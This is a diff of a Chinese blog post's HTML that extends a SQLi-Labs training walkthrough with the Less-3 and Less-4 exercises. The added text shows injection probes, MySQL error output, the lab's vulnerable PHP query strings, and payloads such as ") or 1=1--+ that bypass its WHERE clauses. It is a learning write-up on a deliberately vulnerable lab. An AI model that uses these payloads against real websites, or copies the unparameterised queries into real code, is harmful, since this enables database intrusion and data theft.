@@ -108,7 +108,14 @@
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/12.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/13.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/14.jpg">
-<meta property="og:updated_time" content="2019-05-02T14:10:43.421Z">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/15.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/16.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/17.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/18.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/19.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/20.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/21.jpg">
+<meta property="og:updated_time" content="2019-05-03T04:14:51.641Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs第一章（未完）">
 <meta name="twitter:description" content="前言 注入过程    一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
@@ -390,7 +397,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  721
+                  994
                 </span>
               
 
@@ -470,7 +477,34 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
 <p>使用以下payload均显示正常</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1--+ or 1=1</span><br><span class="line">?id=1 or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>可以使用如下payload获得显示位</p>
+<p><img src="\image\sqli-libs-first\15.jpg" alt="15"></p>
 <p>其余步骤与Less-1相同</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>使用参数<code>?id=1&#39;</code></p>
+<p><img src="\image\sqli-libs-first\16.jpg" alt="16"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>猜测使用的是如下SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> login_name, <span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>= (<span class="string">'our input here'</span>)</span><br></pre></td></tr></table></figure>
+<p>使用参数<code>?id=1)--+</code></p>
+<p><img src="\image\sqli-libs-first\17.jpg" alt="17"></p>
+<p>可以看到显示正常，说明猜测是正确的，查看源代码发现语句如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>使用如下payload同样可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) or &apos;1&apos;=(&apos;1</span><br></pre></td></tr></table></figure>
+<p>获得显示位</p>
+<p><img src="\image\sqli-libs-first\18.jpg" alt="18"></p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>使用参数<code>?id=1&quot;</code>时报错</p>
+<p><img src="\image\sqli-libs-first\19.jpg" alt="19"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>猜测<code>id</code>被括号_()_和_””_所包装</p>
+<p>使用参数<code>?id=1&quot;) --+</code>，可以看到显示正常</p>
+<p><img src="\image\sqli-libs-first\20.jpg" alt="20"></p>
+<p>查看源代码，可以看到语句如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>使用如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;) or &quot;1&quot;=(&quot;1</span><br><span class="line">?id=&quot;) or 1=1--+</span><br></pre></td></tr></table></figure>
+<p>获得显示位</p>
+<p><img src="\image\sqli-libs-first\21.jpg" alt="21"></p>
 
       
     </div>
@@ -502,7 +536,7 @@
   <p><span>本文标题:</span><a href="/sqli-libs-first/">SQLi-Labs第一章（未完）</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
   <p><span>发布时间:</span>2019年04月04日 - 19:04</p>
-  <p><span>最后更新:</span>2019年05月02日 - 22:05</p>
+  <p><span>最后更新:</span>2019年05月03日 - 12:05</p>
   <p><span>原始链接:</span><a href="/sqli-libs-first/" title="SQLi-Labs第一章（未完）">https://cjjkkk.github.io/sqli-libs-first/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/sqli-libs-first/" aria-label="复制成功！"></i></span>
   </p>
@@ -767,7 +801,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li></ol></li></ol></div>
             
 
           </div>
